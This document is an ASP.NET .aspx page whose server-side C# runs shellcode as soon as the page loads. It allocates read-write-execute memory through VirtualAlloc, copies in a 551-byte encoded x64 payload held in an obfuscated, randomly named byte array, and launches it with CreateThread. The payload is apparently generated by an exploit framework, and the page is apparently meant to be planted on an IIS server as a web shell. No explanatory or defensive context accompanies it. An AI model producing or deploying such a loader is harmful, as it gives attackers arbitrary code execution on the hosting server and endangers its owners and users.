<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] z5ltm9 = new byte[551] {
0x48,0x31,0xc9,0x48,0x81,0xe9,0xc0,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,0xbb,0xca,0x8b,0xf0,0xe2,0x6c,0x8a,
0xc2,0x61,0x48,0x31,0x58,0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x36,0xc3,0x73,0x06,0x9c,0x62,0x0e,0x61,0xca,0x8b,0xb1,
0xb3,0x2d,0xda,0x90,0x30,0x9c,0xc3,0xc1,0x30,0x09,0xc2,0x49,0x33,0xaa,0xc3,0x7b,0xb0,0x74,0xc2,0x49,0x33,0xea,0xc3,0x7b,0x90,
0x3c,0xc2,0xcd,0xd6,0x80,0xc1,0xbd,0xd3,0xa5,0xc2,0xf3,0xa1,0x66,0xb7,0x91,0x9e,0x6e,0xa6,0xe2,0x20,0x0b,0x42,0xfd,0xa3,0x6d,
0x4b,0x20,0x8c,0x98,0xca,0xa1,0xaa,0xe7,0xd8,0xe2,0xea,0x88,0xb7,0xb8,0xe3,0xbc,0xec,0x43,0x19,0xd2,0x80,0xf2,0xed,0xe9,0xf8,
0xc2,0x61,0xca,0x00,0x70,0x6a,0x6c,0x8a,0xc2,0x29,0x4f,0x4b,0x84,0x85,0x24,0x8b,0x12,0x31,0x41,0xc3,0xe8,0xa6,0xe7,0xca,0xe2,
0x28,0xcb,0x5b,0x13,0xb4,0x24,0x75,0x0b,0x20,0x41,0xbf,0x78,0xaa,0x6d,0x5c,0x8f,0x50,0x03,0xc3,0xc1,0x22,0xc0,0xcb,0x03,0xa8,
0xc7,0xca,0xf1,0x23,0x54,0x6a,0xb7,0x90,0x86,0x88,0xbc,0xc6,0x64,0xcf,0xfb,0xb0,0xbf,0x53,0xa8,0xa6,0xe7,0xca,0xe6,0x28,0xcb,
0x5b,0x96,0xa3,0xe7,0x86,0x8a,0x25,0x41,0xcb,0xec,0xab,0x6d,0x5a,0x83,0xea,0xce,0x03,0xb8,0xe3,0xbc,0xcb,0x9a,0x20,0x92,0xd5,
0xa9,0xb8,0x2d,0xd2,0x83,0x38,0x8b,0xd1,0xb8,0x61,0x80,0xaa,0x83,0x33,0x35,0x6b,0xa8,0xa3,0x35,0xd0,0x8a,0xea,0xd8,0x62,0xbb,
0x1d,0x93,0x75,0x9f,0x28,0x74,0xfc,0x83,0xd0,0x33,0xb9,0xf0,0x61,0xca,0xca,0xa6,0xab,0xe5,0x6c,0x8a,0xe0,0x26,0x2b,0xf1,0xe2,
0x6c,0xc3,0x4b,0x84,0x83,0x37,0xf2,0xe2,0x4a,0x1e,0xf6,0x51,0x30,0xc7,0xb1,0xb6,0x25,0x03,0x26,0x2d,0x43,0x7a,0xb1,0x58,0x20,
0xfd,0xe4,0x66,0x35,0x5e,0xbc,0x6b,0x86,0xe2,0xc3,0x60,0xca,0x8b,0xa9,0xa3,0xd6,0xa3,0x42,0x0a,0xca,0x74,0x25,0x88,0x69,0xcb,
0x9c,0x31,0x9a,0xc6,0xc1,0x2b,0x21,0xbb,0x02,0x29,0x35,0x4b,0xb8,0x6b,0xae,0xc2,0x3d,0xa1,0x82,0x02,0x31,0xa3,0xd6,0x60,0xcd,
0xbe,0x2a,0x74,0x25,0xaa,0xe5,0x4d,0xa8,0x71,0x8b,0xd3,0xbc,0x6b,0x8e,0xc2,0x4b,0x98,0x8b,0x31,0x69,0x47,0x18,0xeb,0x3d,0xb4,
0x4f,0x4b,0x84,0xe8,0x25,0x75,0x0c,0x14,0x2f,0x63,0x63,0xe2,0x6c,0x8a,0x8a,0xe2,0x26,0x9b,0xb8,0x6b,0x8e,0xc7,0xf3,0xa8,0xa0,
0x8f,0xb1,0xba,0x24,0x03,0x3b,0x20,0x70,0x89,0x29,0x2a,0x33,0x75,0x17,0xe2,0x32,0x8b,0x8e,0xb7,0x24,0x09,0x06,0x41,0x94,0x02,
0x06,0x88,0x2c,0xcb,0x9b,0x09,0xca,0x9b,0xf0,0xe2,0x2d,0xd2,0x8a,0xe8,0x38,0xc3,0xc1,0x2b,0x2d,0x30,0x9a,0xc5,0x99,0x6e,0x0f,
0x37,0x24,0x03,0x01,0x28,0x43,0x4c,0xbd,0xd3,0xa5,0xc3,0x4b,0x91,0x82,0x02,0x2a,0xaa,0xe5,0x73,0x83,0xdb,0xc8,0x52,0x38,0xbd,
0x93,0x5f,0x41,0x99,0xca,0xf6,0xd8,0xba,0x2d,0xdd,0x9b,0x09,0xca,0xcb,0xf0,0xe2,0x2d,0xd2,0xa8,0x61,0x90,0xca,0x4a,0xe9,0x43,
0x85,0xf2,0x9e,0x1f,0xdc,0xa9,0xa3,0xd6,0xff,0xac,0x2c,0xab,0x74,0x25,0xab,0x93,0x44,0x2b,0x5d,0x35,0x74,0x0f,0xaa,0x6d,0x49,
0x8a,0x48,0x0c,0xc3,0x75,0x14,0x19,0x3e,0x83,0x9e,0x2d,0xd3,0x9a,0xe2,0x35,0xc3,0x05,0xa3,0x3a,0x3e,0x52,0xb4,0x93,0x5f,0xc2,
0x61 };

        IntPtr jo84eoPdnw = VirtualAlloc(IntPtr.Zero,(UIntPtr)z5ltm9.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(z5ltm9,0,jo84eoPdnw,z5ltm9.Length);
        IntPtr x4h1vQx = IntPtr.Zero;
        IntPtr eN4vyOjA7 = CreateThread(IntPtr.Zero,UIntPtr.Zero,jo84eoPdnw,IntPtr.Zero,0,ref x4h1vQx);
    }
</script>
